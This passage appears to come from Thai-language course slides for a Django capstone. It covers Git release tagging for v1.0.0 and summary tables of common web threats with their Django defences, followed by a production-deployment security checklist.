เมื่อระบบผ่านการทดสอบ ความปลอดภัย และ Deploy เรียบร้อย ให้ทำการออกเวอร์ชันส่งมอบ **v1.0.0**:

- ใช้มาตรฐาน **Semantic Versioning**: `MAJOR.MINOR.PATCH`
- ทำการรวมโค้ดเข้าสู่กิ่ง `main` ผ่าน Pull Request สุดท้าย
- สร้าง Annotated Tag ใน Git:

  ```bash
  git checkout main && git pull origin main
  git tag -a v1.0.0 -m "Release v1.0.0"
  git push origin v1.0.0
  ```

- สร้าง GitHub Release บนหน้าเว็บ พร้อมแนบ Notes

```
main ──●────●────●──▶
                 ▲
           Tag: v1.0.0
     (Release Candidate Locked)
```

> 💡 **Takeaway** — **Freeze Code**: หลังจากติด Tag `v1.0.0` ให้หยุดการแก้ไขโค้ดเพื่อไม่ให้เกิดข้อผิดพลาดไม่คาดฝันก่อนวันนำเสนอผลงานจริง

## QUICK CHECK: Technical Debt Concept

*(สไลด์ไม่มีเนื้อหาคำถาม)*

## QUICK CHECK: Git Release Tagging for Capstone Delivery

*(สไลด์ไม่มีเนื้อหาคำถาม)*

---

# สรุปบทเรียน: ตารางสังเคราะห์องค์ความรู้

## ตารางสังเคราะห์องค์ความรู้ (ตอนที่ 1): การรับมือภัยคุกคามเว็บใน Django

| ภัยคุกคาม | ลักษณะการโจมตี | เกราะป้องกันใน Django | ข้อควรระวังสำคัญ |
|---|---|---|---|
| **SQL Injection** | แทรกคำสั่ง SQL ปลอมปน | Django ORM Parameterized Queries | ระวังการใช้ `raw()` หรือ `extra()` |
| **XSS** | ฝัง JavaScript รันบนเบราว์เซอร์ | Template Auto-escaping | ห้ามใช้ฟิลเตอร์ `\|safe` กับข้อมูลดิบ |
| **CSRF** | หลอกส่งคำสั่งจากเว็บอื่น | `{% csrf_token %}` + Middleware | ห้ามละเว้นในฟอร์ม POST |
| **Clickjacking** | ครอบ iframe หลอกให้กด | `X-Frame-Options: DENY` | ตั้งค่าใน `settings.py` |

> 💡 **Takeaway** — **Security Takeaway**: อย่าพึ่งพาเพียงการตรวจสอบที่หน้าบ้าน (Frontend Validation) ต้องบังคับใช้เกราะป้องกันที่ฝั่ง Backend และ Framework เสมอ

## ตารางสังเคราะห์องค์ความรู้ (ตอนที่ 2): รายการตรวจสอบก่อนขึ้น Production

| รายการตรวจสอบ | การตั้งค่า / คำสั่ง | เหตุผลทางวิศวกรรม | สถานะ |
|---|---|---|---|
| **Debug Mode** | `DEBUG = False` | ป้องกันข้อมูลความลับรั่วไหล | บังคับ |
| **Allowed Hosts** | `ALLOWED_HOSTS = [...]` | ป้องกัน Host Header Attacks | บังคับ |
| **CSRF Whitelist** | `CSRF_TRUSTED_ORIGINS` | ป้องกัน HTTP 403 เมื่อส่งฟอร์ม HTTPS | บังคับ |
| **Static Serving** | WhiteNoise Middleware | เสิร์ฟไฟล์ CSS/JS ได้แม้ปิด Debug | บังคับ |
| **Production DB** | Managed PostgreSQL | รองรับ Concurrency ข้อมูลไม่สูญหาย | บังคับ |
| **Security Audit** | `python manage.py check --deploy` | ตรวจสอบการตั้งค่าความปลอดภัยอัตโนมัติ | 0 Issues |

> 💡 **Takeaway** — **Production Gate**: หากระบบยังไม่ผ่าน Checklist ข้างต้นครบทุกข้อ ถือว่าระบบยังไม่พร้อมสำหรับการนำเสนอโครงงาน
